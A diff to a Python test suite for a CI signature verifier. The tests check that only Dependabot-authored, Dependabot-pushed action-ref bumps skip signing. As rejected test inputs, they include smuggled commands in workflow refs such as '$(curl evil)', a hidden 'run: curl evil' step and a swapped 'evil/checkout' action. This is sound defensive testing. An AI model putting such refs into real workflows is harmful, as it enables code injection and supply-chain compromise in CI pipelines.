@@ -63,10 +63,11 @@ class Repo:
     def head(self):
         return git(self.dir, "rev-parse", "HEAD").stdout.strip()
 
-    def verify(self):
-        return subprocess.run([sys.executable, str(VERIFY), "--repo", str(self.dir),
-                               "--base", self.base, "--head", self.head()],
-                              capture_output=True, text=True, env=CLEAN_ENV)
+    def verify(self, author=None, sender=None):
+        args = [sys.executable, str(VERIFY), "--repo", str(self.dir), "--base", self.base, "--head", self.head()]
+        args += ["--author", author] if author is not None else []
+        args += ["--sender", sender] if sender is not None else []
+        return subprocess.run(args, capture_output=True, text=True, env=CLEAN_ENV)
 
     def cleanup(self):
         shutil.rmtree(self.dir, ignore_errors=True)
@@ -86,12 +87,12 @@ class ApprovalTests(unittest.TestCase):
     def g(self, *args):
         return git(self.r.dir, *args)
 
-    def assertPasses(self):
-        res = self.r.verify()
+    def assertPasses(self, **who):
+        res = self.r.verify(**who)
         self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
 
-    def assertFails(self, needle=None):
-        res = self.r.verify()
+    def assertFails(self, needle=None, **who):
+        res = self.r.verify(**who)
         self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
         if needle:
             self.assertIn(needle, res.stdout)
@@ -319,18 +320,53 @@ class ApprovalTests(unittest.TestCase):
         return ("name: ci\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n"
                 f"      - uses: {uses}\n      - run: make test\n")
 
-    def test_a_dependabot_style_ref_bump_to_ordinary_ci_passes_unsigned(self):
+    DEPENDABOT = {"author": "dependabot[bot]", "sender": "dependabot[bot]"}
+
+    def _bump_branch(self, before="actions/checkout@" + "a" * 40 + " # v4.1.0", ci=None):
         self.g("checkout", "-q", "main")
-        self.r.write(".github/workflows/ci.yml", self._ci("actions/checkout@" + "a" * 40 + " # v4.1.0"))
+        self.r.write(".github/workflows/ci.yml", (ci or self._ci)(before))
         self.r.commit("CI exists on the base", key=self.r.trusted)
         self.r.base = self.r.head()
         self.g("checkout", "-q", "-b", "bump")
+
+    def test_a_dependabot_ref_bump_to_ordinary_ci_passes_unsigned(self):
+        self._bump_branch()
         self.r.write(".github/workflows/ci.yml", self._ci("actions/checkout@" + "b" * 40 + " # v4.2.0"))
         self.r.commit("Bump actions/checkout from 4.1.0 to 4.2.0")
-        self.assertPasses()
+        self.assertPasses(**self.DEPENDABOT)
         self.r.write(".github/workflows/ci.yml", self._ci("evil/checkout@" + "b" * 40 + " # v4.2.0"))
         self.r.commit("a different action under the bump's cover")
-        self.assertFails(".github/workflows/ci.yml")
+        self.assertFails(".github/workflows/ci.yml", **self.DEPENDABOT)
+
+    def test_a_ref_bump_from_anyone_but_dependabot_needs_a_signature(self):
+        # Security re-review 3, 2026-11-06: a SHA that exists only in a fork resolves through the
+        # parent's path, so the same action path is not the same publisher. Only Dependabot's own
+        # pull requests, pushed only by Dependabot, are exempt.
+        self._bump_branch()
+        self.r.write(".github/workflows/ci.yml", self._ci("actions/checkout@" + "b" * 40 + " # v4.2.0"))
+        self.r.commit("Bump actions/checkout from 4.1.0 to 4.2.0")
+        for who in ({}, {"author": "someone"}, {"author": "dependabot[bot]"},
+                    {"author": "dependabot[bot]", "sender": "someone"},
+                    {"author": "someone", "sender": "dependabot[bot]"}, {"author": "", "sender": ""}):
+            with self.subTest(who=who):
+                self.assertFails(".github/workflows/ci.yml", **who)
+
+    def test_a_dependabot_bump_that_is_not_only_refs_needs_a_signature(self):
+        self._bump_branch(before="actions/checkout@v4")
+        for after in ("actions/checkout@$(curl evil)", "actions/checkout@${{ github.head_ref }}",
+                      "actions/checkout@v4\f      - run: curl evil"):
+            with self.subTest(after=after):
+                self.r.write(".github/workflows/ci.yml", self._ci(after))
+                self.r.commit("not only a ref")
+                self.assertFails(".github/workflows/ci.yml", **self.DEPENDABOT)
+                self.g("reset", "-q", "--hard", "HEAD~1")
+
+    def test_a_dependabot_bump_to_a_reusable_workflow_needs_a_signature(self):
+        reusable = lambda uses: self._ci(uses).replace("on: push", "on:\n  workflow_call:")
+        self._bump_branch(before="actions/checkout@v4", ci=reusable)
+        self.r.write(".github/workflows/ci.yml", reusable("actions/checkout@v5"))
+        self.r.commit("bump")
+        self.assertFails(".github/workflows/ci.yml", **self.DEPENDABOT)
 
     def test_a_ref_bump_to_a_deploy_workflow_still_needs_a_signature(self):
         self.g("checkout", "-q", "main")
@@ -341,7 +377,7 @@ class ApprovalTests(unittest.TestCase):
         self.g("checkout", "-q", "-b", "bump")
         self.r.write(".github/workflows/deploy.yml", self._ci("actions/checkout@v5"))
         self.r.commit("bump")
-        self.assertFails(".github/workflows/deploy.yml")
+        self.assertFails(".github/workflows/deploy.yml", **self.DEPENDABOT)
 
     def test_a_malformed_deploy_list_widens_the_guard(self):
         self.g("checkout", "-q", "main")
@@ -352,7 +388,7 @@ class ApprovalTests(unittest.TestCase):
         self.g("checkout", "-q", "-b", "bump")
         self.r.write(".github/workflows/ci.yml", self._ci("actions/checkout@v5"))
         self.r.commit("bump")
-        self.assertFails(".github/workflows/ci.yml")
+        self.assertFails(".github/workflows/ci.yml", **self.DEPENDABOT)
 
     def test_a_deploy_workflow_the_base_lists_needs_a_signature(self):
         self.g("checkout", "-q", "main")
